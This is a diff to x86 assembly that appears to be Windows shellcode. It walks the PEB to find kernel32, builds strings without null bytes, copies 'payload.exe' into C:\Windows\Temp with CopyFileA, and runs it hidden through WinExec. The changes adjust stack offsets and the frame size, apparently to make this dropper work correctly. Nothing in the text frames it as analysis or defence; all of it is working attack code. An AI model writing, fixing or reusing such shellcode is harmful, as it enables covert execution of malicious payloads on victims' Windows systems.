@@ -137,7 +137,7 @@ main:
     mov  ebp, esp
     xor  ecx, ecx
     mov  ecx, 0x01010301
-    xor  ecx, 0x01010201
+    xor  ecx, 0x01010101
     sub  esp, ecx
 
     ; Bootstrap: find kernel32 via PEB walk
@@ -166,7 +166,7 @@ main:
 ; -- String Construction --
 
 ; --- src_path: "C:\source\payload.exe" (mov) ---
-    lea  edi, [ebp-0x98]
+    lea  edi, [ebp-0x118]
 ; emit_mov: "C:\source\payload.exe" (null-safe)
 ; 24 bytes written to [edi]
 
@@ -185,7 +185,7 @@ main:
     mov  [edi+0x14], eax
 
 ; --- dst_path: "C:\Windows\Temp\payload.exe" (mov) ---
-    lea  edi, [ebp-0xb4]
+    lea  edi, [ebp-0x134]
 ; emit_mov: "C:\Windows\Temp\payload.exe" (null-safe)
 ; 28 bytes written to [edi]
 
@@ -239,9 +239,9 @@ wf_entry:
     ; CopyFileA(lpExistingFileName, lpNewFileName, bFailIfExists)
     xor  eax, eax
     push eax                      ; bFailIfExists
-    lea  eax, [ebp-0xb4]
+    lea  eax, [ebp-0x134]
     push eax                      ; lpNewFileName
-    lea  eax, [ebp-0x98]
+    lea  eax, [ebp-0x118]
     push eax                      ; lpExistingFileName
     call dword ptr [ebp-0x24]
     mov  [ebp-0x30], eax
@@ -256,7 +256,7 @@ wf_run_payload:
     ; WinExec(lpCmdLine, uCmdShow)
     xor  eax, eax
     push eax                      ; uCmdShow
-    lea  eax, [ebp-0xb4]
+    lea  eax, [ebp-0x134]
     push eax                      ; lpCmdLine
     call dword ptr [ebp-0x28]
     mov  [ebp-0x34], eax
